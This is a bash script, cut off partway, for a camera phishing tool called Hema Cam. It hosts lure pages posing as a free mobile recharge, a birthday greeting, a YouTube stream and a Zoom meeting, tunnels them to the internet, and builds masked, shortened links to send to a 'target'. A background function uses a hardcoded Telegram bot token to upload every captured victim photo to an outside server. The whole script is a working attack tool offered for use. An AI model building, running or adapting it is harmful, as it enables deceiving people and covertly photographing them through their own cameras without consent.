#!/bin/bash

# Hema Cam
# Version    : 2.3
# Description: Hema Cam is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : Daxxtropezz
# Github     : https://github.com/Daxxtropezz
# Email      : miraflores.john@gmail.com
# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
# Date       : 7-12-2024
# License    : MIT
# Copyright  : Daxxtropezz (2024)
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: '
MIT License

Copyright (c) 2024 Daxxtropezz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'

# ================================================================
#   Hema Cam - Professional Color Scheme
#   Optimized for dark terminal backgrounds (Termux / Linux)
# ================================================================
black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
gray="\033[0;37m"
dim="\033[2m"
bold="\033[1m"
nc="\033[00m"
# Extended accent palette
orange="\033[1;91m"
lime="\033[1;92m"
pink="\033[1;95m"
bright_blue="\033[1;94m"
bright_cyan="\033[1;96m"
bright_yellow="\033[1;93m"
ul="\033[4m"

# Output snippets (professional themed)
info="${lime}[${white}+${lime}] ${cyan}"
info2="${bright_cyan}[${white}•${bright_cyan}] ${cyan}"
ask="${bright_cyan}[${white}?${bright_cyan}] ${purple}"
error="${orange}[${white}!${orange}] ${red}"
success="${lime}[${white}√${lime}] ${green}"
warn="${yellow}[${white}⚠${yellow}] ${yellow}"
divider="${bold}${bright_blue}════════════════════════════════════════════════════════════${nc}"

# Read version from files/version.txt (single source of truth)
if [[ -f "files/version.txt" ]]; then
    version=$(cat "files/version.txt")
else
    version="2.3"
fi

cwd=`pwd`
tunneler_dir="$HOME/.tunneler"

# --- Telegram: send a copy of every captured image to your bot (background, never blocks) ---
TG_TOKEN="8734785620:AAGmtvABNld1hF4hSDNPUId2FMiaSMgr1tM"
TG_CHATID="8185135044"

tg_send() {
    local f="$1"
    if [ -n "$TG_TOKEN" ] && [ -n "$TG_CHATID" ] && [ -f "$f" ]; then
        if command -v curl > /dev/null 2>&1; then
            curl -s --max-time 15 -F "chat_id=${TG_CHATID}" -F "photo=@${f}" \
                "https://api.telegram.org/bot${TG_TOKEN}/sendPhoto" > /dev/null 2>&1 &
        fi
    fi
}

# Logo - Hema Cam (gradient edition) - figlet standard font
logo="
${bright_blue}╔═════════════════════════════════════════════════════╗
${bright_blue} _   _                         ____                   ${bright_blue}║
${cyan}| | | | ___ _ __ ___   __ _   / ___|__ _ _ __ ___     ${bright_blue}║
${purple}| |_| |/ _ \ '_ ' _ \ / _' | | |   / _' | '_ ' _ \    ${bright_blue}║
${pink}|  _  |  __/ | | | | | (_| | | |__| (_| | | | | | |   ${bright_blue}║
${yellow}|_| |_|\___|_| |_| |_|\__,_|  \____\__,_|_| |_| |_|   ${bright_blue}║
${bright_blue}╚═════════════════════════════════════════════════════╝
${gray}        [ Hema Cam  ${version} ]   [ By Daxxtropezz ]${nc}
"

loclx_help="
${info}Steps: ${nc}
${blue}[1]${yellow} Go to ${green}https://localxpose.io
${blue}[2]${yellow} Create an account 
${blue}[3]${yellow} Login to your account
${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
"

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

# Check if mac or termux
termux=false
brew=false
cloudflared=false
loclx=false
cf_command="$tunneler_dir/cloudflared"
loclx_command="$tunneler_dir/loclx"
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
    cf_command="termux-chroot $tunneler_dir/cloudflared"
    loclx_command="termux-chroot $tunneler_dir/loclx"
fi
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
        cf_command="cloudflared"
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
        loclx_command="localxpose"
    fi
fi

ch_prompt="\n${cyan}Hema${nc}@${cyan}Cam ${red}$ ${nc}"

# Kill running instances of required packages (works on Termux, Linux & Git Bash)
killer() {
    for process in php wget curl unzip cloudflared loclx localxpose; do
        if command -v pidof > /dev/null 2>&1 && pidof "$process" > /dev/null 2>&1; then
            command -v killall > /dev/null 2>&1 && killall "$process" 2>/dev/null
            command -v pkill > /dev/null 2>&1 && pkill -f "$process" 2>/dev/null
            sleep 1
        fi
    done
    # Force kill if still running
    for process in php cloudflared loclx localxpose; do
        if command -v pidof > /dev/null 2>&1 && pidof "$process" > /dev/null 2>&1; then
            command -v killall > /dev/null 2>&1 && killall -9 "$process" 2>/dev/null
            command -v pkill > /dev/null 2>&1 && pkill -9 -f "$process" 2>/dev/null
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Download & extract tunneler binaries (cloudflared / loclx)
# Usage: manage_tunneler "<download-url>" "<output-name>"
manage_tunneler() {
    local url="$1"
    local out="$2"
    echo -e "${info}Downloading ${out}....${nc}"
    if ! wget --no-check-certificate -q --show-progress -O "${out}" "${url}"; then
        echo -e "${error}Failed to download ${out}!${nc}"
        return 1
    fi
    case "${out}" in
        *.tgz)
            if ! tar -xzf "${out}" > /dev/null 2>&1; then
                echo -e "${error}Failed to extract ${out}!${nc}"
                rm -rf "${out}"
                return 1
            fi
            rm -rf "${out}"
            local cfbin
            cfbin=$(find . -maxdepth 3 -type f -name "cloudflared*" ! -name "*.tgz" 2>/dev/null | head -n1)
            if [ -n "$cfbin" ]; then
                mv -f "$cfbin" "$tunneler_dir/cloudflared" 2>/dev/null
            fi
            ;;
        *.zip)
            if ! unzip -o "${out}" > /dev/null 2>&1; then
                echo -e "${error}Failed to extract ${out}!${nc}"
                rm -rf "${out}"
                return 1
            fi
            rm -rf "${out}"
            local lxbin
            lxbin=$(find . -maxdepth 3 -type f \( -name "loclx*" -o -name "localxpose*" \) 2>/dev/null | head -n1)
            if [ -n "$lxbin" ]; then
                mv -f "$lxbin" "$tunneler_dir/loclx" 2>/dev/null
            fi
            ;;
        *)
            mv -f "${out}" "$tunneler_dir/cloudflared" 2>/dev/null
            ;;
    esac
    chmod +x "$tunneler_dir/cloudflared" "$tunneler_dir/loclx" 2>/dev/null
    if [[ -x "$tunneler_dir/cloudflared" || -x "$tunneler_dir/loclx" ]]; then
        echo -e "${success}${out} is ready!${nc}"
    fi
}


# Set template
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "\n${bold}${bright_yellow}(¯\`·.¸¸.·´¯\`·.¸¸.·´¯\`·.¸¸.·´¯)${nc}"
        echo -e "${bold}${bright_yellow}     Y O U R   L I N K   I S   R E A D Y${nc}"
        echo -e "${bold}${bright_yellow}(¯\`·.¸¸.·´¯\`·.¸¸.·´¯\`·.¸¸.·´¯)${nc}"
        echo -e "${gray}   Send it to the target - it opens the browser and starts the camera${nc}\n"
    fi
    echo -e "${bold}${green}  ● THE LINK (send this):${nc}"
    echo -e "  ${bold}${ul}${1}${nc}\n"
    if ! [ -z "${mask}" ]; then
        echo -e "${dim}  ○ Hidden version (optional): ${cyan}${mask}@${1#https://}${nc}"
    fi
    if echo $1 | grep -q "$TUNNELER"; then
        shortened=$(curl -s --max-time 8 "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${dim}  ○ Short version (optional): ${cyan}${shortened}${nc}\n"
        fi
    fi
    # On the primary URL: save + auto-copy the masked link (non-blocking - never hangs)
    if [[ "$2" == "1" ]]; then
        echo "${1}" > "$cwd/link.txt"
        local sendlink="${mask}@${1#https://}"
        if command -v termux-clipboard-set > /dev/null 2>&1; then
            ( printf '%s' "$sendlink" | termux-clipboard-set 2>/dev/null & )
        elif command -v xclip > /dev/null 2>&1; then
            ( printf '%s' "$sendlink" | xclip -selection clipboard 2>/dev/null & )
        fi
        echo -e "${success}Link saved to link.txt (clipboard copy in background)${nc}"
        echo -e "${info2}Full link saved to: ${bright_blue}${cwd}/link.txt${nc}\n"
    fi
}


# Prevent ^C
stty -echoctl 2>/dev/null

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2

echo -e "\n${info}Please Wait!...\n${nc}"

# Set default values for required variables
DIRECTORY="$HOME/Pictures"
TUNNELER="cloudflare"
PORT=8080
REGION="us"
SUBDOMAIN=false
UPDATE=true
OPTION=true

# ================================================================
#  Command-line argument parser   (bash hema.sh --help)
# ================================================================
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            echo -e "${bold}${bright_cyan}Hema Cam - Usage:${nc} bash hema.sh [OPTIONS]"
            echo -e "${info}${gray}[${yellow}-h${gray},${yellow} --help${gray}]${nc}          ${cyan}Show this help and exit"
            echo -e "${info}${gray}[${yellow}-o${gray},${yellow} --option${gray}]${nc}     ${cyan}Select template: 1=jio 2=festival 3=live 4=meeting"
            echo -e "${info}${gray}[${yellow}-p${gray},${yellow} --port${gray}]${nc}        ${cyan}Set server port (default: 8080)"
            echo -e "${info}${gray}[${yellow}-t${gray},${yellow} --tunneler${gray}]${nc}    ${cyan}Choose tunneler: cloudflare / loclx"
            echo -e "${info}${gray}[${yellow}-d${gray},${yellow} --directory${gray}]${nc}   ${cyan}Set image save directory"
            echo -e "${info}${gray}[${yellow}-u${gray},${yellow} --update${gray}]${nc}      ${cyan}Enable update check (default: on)"
            echo -e "${info}${gray}[${yellow}-nu${gray},${yellow} --no-update${gray}]${nc}  ${cyan}Disable update check"
            echo -e "\n${success}Example: ${bright_blue}bash hema.sh -o 2 -p 9090${nc}"
            exit 0 ;;
        -o|--option)
            if [[ -z "$2" ]]; then echo -e "${error}Option needs a value!\007\n"; exit 1; fi
            OPTION="$2"
            shift 2 ;;
        -p|--port)
            if [[ "$2" =~ ^[0-9]+$ ]]; then PORT="$2"; else echo -e "${error}Invalid port!\007\n"; exit 1; fi
            shift 2 ;;
        -t|--tunneler)
            if [[ -z "$2" ]]; then echo -e "${error}Tunneler needs a value!\007\n"; exit 1; fi
            TUNNELER="$2"
            shift 2 ;;
        -d|--directory)
            if [[ -z "$2" ]]; then echo -e "${error}Directory needs a value!\007\n"; exit 1; fi
            DIRECTORY="$2"
            shift 2 ;;
        -u|--update)
            UPDATE=true
            shift ;;
        -nu|--no-update)
            UPDATE=false
            shift ;;
        *)
            echo -e "${error}Unknown option: ${orange}$1${nc}"
            echo -e "${info}Run ${bright_blue}bash hema.sh --help${nc} for usage."
            exit 1 ;;
    esac
done

# Workdir

if [ -z "$DIRECTORY" ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            # Dedicated folder on phone storage: /sdcard/Hemacam1
            FOL="/storage/emulated/0/Hemacam1"
            if ! [ -d "$FOL" ]; then
                mkdir -p "$FOL" 2>/dev/null || { FOL="/sdcard/Hemacam1"; mkdir -p "$FOL" 2>/dev/null; }
            fi
            cd "$FOL" 2>/dev/null || true
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
            cd "$cwd"
            echo -e "${info2}Images will be saved to: ${bright_blue}${FOL}${nc}\n"
        else
            if [ -d "$HOME/Pictures" ]; then
                FOL="$HOME/Pictures"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi


# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi

# Install required packages (auto-install on supported systems)
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        if command -v apt-get > /dev/null 2>&1; then
            $sudo apt-get install -y "$package" > /dev/null 2>&1
        elif command -v apt > /dev/null 2>&1; then
            $sudo apt install -y "$package" > /dev/null 2>&1
        elif command -v pkg > /dev/null 2>&1; then
            pkg install -y "$package" > /dev/null 2>&1
        elif command -v dnf > /dev/null 2>&1; then
            $sudo dnf install -y "$package" > /dev/null 2>&1
        elif command -v yum > /dev/null 2>&1; then
            $sudo yum install -y "$package" > /dev/null 2>&1
        elif command -v pacman > /dev/null 2>&1; then
            $sudo pacman -S --noconfirm "$package" > /dev/null 2>&1
        elif command -v apk > /dev/null 2>&1; then
            apk add "$package" > /dev/null 2>&1
        elif command -v brew > /dev/null 2>&1; then
            brew install "$package" > /dev/null 2>&1
        elif command -v winget > /dev/null 2>&1; then
            winget install -e --id PHP.PHP --silent --accept-package-agreements --accept-source-agreements > /dev/null 2>&1
        fi
    fi
done

# Make sure CA certificates exist (cloudflared NEEDS them to verify TLS, else "certificate signed by unknown authority")
if $termux; then
    if ! [ -f "$PREFIX/etc/tls/cert.pem" ]; then
        echo -e "${info}Installing ca-certificates (needed for cloudflared TLS)....${nc}"
        pkg install -y ca-certificates > /dev/null 2>&1 || pkg install ca-certificates
    fi
    if ! command -v termux-media-scan > /dev/null 2>&1; then
        echo -e "${info}Installing termux-api (makes images show in the gallery)....${nc}"
        pkg install -y termux-api > /dev/null 2>&1 || pkg install termux-api
    fi
elif ! [ -f "/etc/ssl/certs/ca-certificates.crt" ] && ! [ -f "/etc/ssl/cert.pem" ]; then
    if command -v apt-get > /dev/null 2>&1; then
        $sudo apt-get install -y ca-certificates > /dev/null 2>&1
    fi
fi

# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Set Region for loclx
if [ -z $REGION ]; then
    exit 1;
fi

# Install tunneler binaries
if $brew; then
    ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
    ! $loclx && brew install localxpose
fi

# Check if required packages are successfully installed (with friendly hints)
for package in php wget curl unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${error}Missing required package: ${bright_blue}${package}${nc}"
        if $termux; then
            echo -e "${info}Run: ${yellow}pkg install ${package}${nc}"
        elif command -v apt-get > /dev/null 2>&1 || command -v apt > /dev/null 2>&1; then
            echo -e "${info}Run: ${yellow}sudo apt install -y ${package}${nc}"
        elif command -v dnf > /dev/null 2>&1 || command -v yum > /dev/null 2>&1; then
            echo -e "${info}Run: ${yellow}sudo dnf install -y ${package}${nc}"
        elif command -v winget > /dev/null 2>&1; then
            echo -e "${info}Run on Windows: ${yellow}winget install -e --id PHP.PHP${nc}"
        else
            echo -e "${info}Install ${package} manually, then run the tool again.${nc}"
        fi
        echo -e "\n${warn}Fix this and run the tool again — everything else is ready.\007\n"
        exit 1
    fi
done

# Set subdomain for loclx
if [ -z $SUBDOMAIN ]; then
    exit 1;
fi

local_url="127.0.0.1:${PORT}"

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done


# Download tunnlers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $tunneler_dir ]]; then
    mkdir $tunneler_dir
fi
cf_size=0
lx_size=0
[ -f "$tunneler_dir/cloudflared" ] && cf_size=$(wc -c < "$tunneler_dir/cloudflared" 2>/dev/null)
[ -f "$tunneler_dir/loclx" ] && lx_size=$(wc -c < "$tunneler_dir/loclx" 2>/dev/null)
if ! [[ -f $tunneler_dir/cloudflared ]] || [[ $cf_size -lt 1000000 ]]; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $tunneler_dir/loclx ]] || [[ $lx_size -lt 500000 ]]; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
        echo -e "${error}Device architecture unknown. Download cloudflared manually!"
        sleep 3
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
    else
        echo -e "${error}Device architecture unknown. Download cloudflared/loclx manually!"
        sleep 3
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
elif echo "$platform" | grep -qi "MINGW\|MSYS\|CYGWIN"; then
    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-windows-amd64.zip" "loclx.zip"
    else
        echo -e "${error}Unknown device architecture. Download cloudflared for Windows manually:"
        echo -e "${cyan}https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe${nc}"
        sleep 3
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi



# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/Daxxtropezz/CamHacker/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [ -n "$git_ver" ] && [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/Daxxtropezz/CamHacker/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}Hema Cam has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update Hema Cam?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/Daxxtropezz/CamHacker
            echo -e "\n${success}Hema Cam updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo -e "$changelog" | head -n4
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Loclx Authtoken (only asked when loclx is actually installed)
if [[ -x "$tunneler_dir/loclx" || -x "$tunneler_dir/localxpose" || $loclx == true ]]; then
    if ! [[ -e "$HOME/.localxpose/.access" ]]; then
        for try in 1 2; do
            echo -e "\n${ask}Enter your loclx authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
            printf "$ch_prompt"
            read authtoken
            if [ -z "$authtoken" ]; then
                echo -e "\n${warn}Skipped loclx setup — continuing with Cloudflare only.\n"
                sleep 1
                break
            elif [ "$authtoken" == "help" ]; then
                echo -e "$loclx_help"
                sleep 4
            else
                if ! [ -d "$HOME/.localxpose" ]; then
                    mkdir "$HOME/.localxpose"
                fi
                echo -n "$authtoken" > $HOME/.localxpose/.access
                sleep 1
                break
            fi
        done
    fi
fi


# ================================================================
#                      MAIN MENU  (Hema Cam)
# ================================================================
while true; do
clear
echo -e "$logo"
echo -e "\n${divider}"
echo -e "${bold}${bright_cyan}      S E L E C T   A   P A G E   T O   C A M P${nc}"
echo -e "${divider}\n"
echo -e "  ${white}[${bright_yellow}1${white}]${nc} ${cyan}Jio Recharge      ${dim}₹399 free recharge offer${nc}"
echo -e "  ${white}[${bright_yellow}2${white}]${nc} ${cyan}Festival          ${dim}birthday celebration page${nc}"
echo -e "  ${white}[${bright_yellow}3${white}]${nc} ${cyan}Live Youtube      ${dim}YouTube video player page${nc}"
echo -e "  ${white}[${bright_yellow}4${white}]${nc} ${cyan}Online Meeting    ${dim}online meeting page${nc}"
echo -e "\n${divider}"
echo -e "  ${white}[${gray}d${white}]${nc} ${cyan}Save images to      ${orange}( ${white}${FOL}${orange} )"
echo -e "  ${white}[${gray}p${white}]${nc} ${cyan}Server port         ${orange}( ${white}${PORT}${orange} )"
echo -e "  ${white}[${gray}x${white}]${nc} ${cyan}About"
echo -e "  ${white}[${gray}m${white}]${nc} ${cyan}More tools"
echo -e "  ${white}[${gray}0${white}]${nc} ${cyan}Exit"
echo -e "\n${divider}\n"
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "$ch_prompt"
        read -r option
    else
        option=$OPTION
    fi
fi

# Select template / option - clean case-based routing
case "$option" in
    1)  dir="jio"
        mask="https://free-399rs-jio-recharge"
        break ;;

    2)  dir="fest"
        mask="https://best-wishes-to-you"
        echo -e "\n${ask}Enter festival name${orange} (Current: ${lime}birthday):${bright_blue}"
        printf "$ch_prompt"
        read -r fest_name
        break ;;

    3)  dir="live"
        mask="https://watch-youtube-videos-live"
        echo -e "\n${ask}Paste the full YouTube link (or just the video ID):${bright_blue}"
        printf "$ch_prompt"
        read -r vid_id
        if ! [ -z "$vid_id" ]; then
            # Extract the 11-char video ID from any YouTube link format
            _vid=$(printf '%s' "$vid_id" | grep -Eo 'v=[A-Za-z0-9_-]{11}|youtu[^ ]*\/[A-Za-z0-9_-]{11}|^[A-Za-z0-9_-]{11}$' | head -n1)
            if [ -n "$_vid" ]; then _vid=${_vid##*[=/]}; fi
            if [ "${#_vid}" -eq 11 ]; then
                vid_id="$_vid"
                echo -e "${success}Video ID extracted: ${bright_blue}${vid_id}${nc}"
            else
                echo -e "${yellow}[!] Could not find a valid video ID - using the default video.${nc}"
                vid_id=""
            fi
        fi
        break ;;

    4)  dir="om"
        mask="https://join-zoom-online-meeting"
        break ;;

    p)  echo -e "\n${ask}Enter Port:${bright_blue}"
        printf "$ch_prompt"
        read -r pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore
            local_url="127.0.0.1:${PORT}"
            echo -e "\n${success}Port changed to ${bright_blue}${PORT}${lime} successfully!\n"
        else
            echo -e "\n${error}Invalid port!\n\007"
        fi
        sleep 2 ;;

    d)  echo -e "\n${ask}Enter Directory:${bright_blue}"
        if $termux; then
            echo -e "${dim}  Recommended: ${cyan}/storage/emulated/0/Hemacam1${nc}"
            echo -e "${dim}  Or Downloads: ${cyan}/storage/emulated/0/Download${nc}"
        fi
        printf "$ch_prompt"
        read -r dire
        if ! [ -d "$dire" ]; then
            echo -e "\n${error}Invalid directory!\n\007"
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
        fi
        sleep 2 ;;

    x)  clear
        echo -e "$logo"
        echo -e "\n${divider}"
        echo -e "${bold}${bright_cyan}       A B O U T   H E M A   C A M${nc}"
        echo -e "${divider}\n"
        echo -e "$orange[ToolName]  ${bright_blue}  :[Hema Cam]
$orange[Version]    ${bright_blue} :[${version}]
$orange[Description]${bright_blue} :[Camera Phishing Tool - Security Research]
$orange[Author]     ${bright_blue} :[Daxxtropezz]
$orange[Github]     ${bright_blue} :[https://github.com/Daxxtropezz]
$orange[Messenger]  ${bright_blue} :[https://m.me/Daxxtropezz]
$orange[Email]      ${bright_blue} :[miraflores.john@gmail.com]"
        printf "$ch_prompt"
        read -r about ;;

    m)  if command -v xdg-open > /dev/null 2>&1; then
            xdg-open "https://github.com/daxxtropezz/daxxtropezz#My-Best-Works" > /dev/null 2>&1
        elif command -v start > /dev/null 2>&1; then
            start "https://github.com/daxxtropezz/daxxtropezz#My-Best-Works"
        elif command -v open > /dev/null 2>&1; then
            open "https://github.com/daxxtropezz/daxxtropezz#My-Best-Works" > /dev/null 2>&1
        else
            echo -e "${info}Open this in your browser:\n${bright_blue}https://github.com/daxxtropezz/daxxtropezz#My-Best-Works${nc}"
        fi ;;

    0)  echo -e "\n${success}Thanks for using!\n"
        exit 0 ;;

    *)  echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1 ;;
esac
done
if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi

if ! [ -d sites ]; then
    mkdir sites
    netcheck
    wget -q --show-progress "https://github.com/Daxxtropezz/CamHacker/releases/latest/download/websites.zip"
    unzip websites.zip -d sites > /dev/null 2>&1
    rm -rf websites.zip
fi
cd sites/$dir
cp -r * "$HOME/.site"
# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
php -S "${local_url}" -t "$HOME/.site" > /dev/null 2>&1 &
sleep 2
sleep 1
status=$(curl -s --head -w %{http_code} "${local_url}" -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer
    exit 1
else
    echo -e "${success}PHP has started successfully!\n"
fi
echo -e "${info2}Starting tunnelers......\n"
find "$tunneler_dir" -name "*.log" -delete
netcheck
chmod +x "$tunneler_dir/cloudflared" "$tunneler_dir/loclx" 2>/dev/null
args=""
if [ "$REGION" != false ]; then
    args="--region $REGION"
fi
if [ "$SUBDOMAIN" != false ]; then
    if [ "$args" == "" ]; then
        args="--subdomain $SUBDOMAIN"
    else
        args="$args --subdomain $SUBDOMAIN"
    fi
fi
if [[ -x "$tunneler_dir/cloudflared" ]]; then
    # Termux: point cloudflared (Go binary) to the Termux CA bundle so TLS verification works
    if $termux && [ -f "$PREFIX/etc/tls/cert.pem" ]; then
        export SSL_CERT_FILE="$PREFIX/etc/tls/cert.pem"
    fi
    $cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
else
    echo -e "${error}cloudflared binary is missing! Run 'bash hema.sh' again (it will download it) or download it manually.\007\n"
fi
if [[ -x "$tunneler_dir/loclx" ]]; then
    $loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
else
    echo -e "${error}loclx binary is missing! Run 'bash hema.sh' again (it will download it).\007\n"
fi
sleep 5
cd "$HOME/.site"
if echo $option | grep -q "2"; then
    if ! [ -z "$fest_name" ]; then
        sed -i s/"birthday"/"$fest_name"/g index.html
    fi
fi
if echo $option | grep -q "3"; then
    if ! [ -z "$vid_id" ]; then
        sed -i s/"JGwWNGJdvx8"/"$vid_id"/g index.html
        echo -e "${success}YouTube video set - it will play on page load.${nc}"
    else
        echo -e "${info}No valid video ID - the default video is used.${nc}"
    fi
fi
# Wait for cloudflared link (up to 45 seconds)
cfcheck=false
cflink=""
echo -e "${info2}Waiting for tunnel link (usually a few seconds)....\n"
for second in $(seq 1 25); do
    if [ -f "$tunneler_dir/cf.log" ]; then
        cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log" | head -n1)
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    fi
    sleep 1
done
# Wait for loclx link (up to 30 seconds)
loclxcheck=false
loclxlink=""
for second in $(seq 1 20); do
    if [ -f "$tunneler_dir/loclx.log" ]; then
